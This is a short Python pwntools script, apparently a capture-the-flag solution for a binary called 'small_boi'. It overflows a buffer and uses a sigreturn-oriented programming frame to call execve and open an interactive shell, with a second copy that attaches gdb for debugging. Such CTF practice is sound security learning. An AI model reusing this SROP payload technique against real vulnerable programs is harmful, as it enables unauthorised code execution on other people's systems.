#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-08-01 15:03:50
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *
from pwn import p64

context.arch = "amd64"

filename = "./small_boi"
binary_target = ELF(filename)
target_process = process(filename)


def exploit():
    sigreturn_function = p64(0x40017c)

    sigret_frame = SigreturnFrame()
    sigret_frame.rax = 59
    sigret_frame.rdi = 0x4001ca
    sigret_frame.rsi = 0x0
    sigret_frame.rdx = 0x0
    sigret_frame.rip = 0x400185

    frame_bytes = bytes(sigret_frame)

    payload = cyclic(40) + sigreturn_function + frame_bytes[8:]
    target_process.send(payload)
    
    target_process.interactive()



def debug():
    script = """
    break *0x0040017c
    """
    gdb.attach(target_process, gdbscript=script)
    input("Press Enter to continue...")
    
    sigreturn_function = p64(0x40017c)

    sigret_frame = SigreturnFrame()
    sigret_frame.rax = 59
    sigret_frame.rdi = 0x4001ca
    sigret_frame.rsi = 0x0
    sigret_frame.rdx = 0x0
    sigret_frame.rip = 0x400185

    frame_bytes = bytes(sigret_frame)

    payload = cyclic(40) + sigreturn_function + frame_bytes[8:]
    
    print(payload)

    target_process.send(payload)
    print("sent payload")

    target_process.interactive()


if __name__ == "__main__":
    # debug()
    # solve()
    exploit()


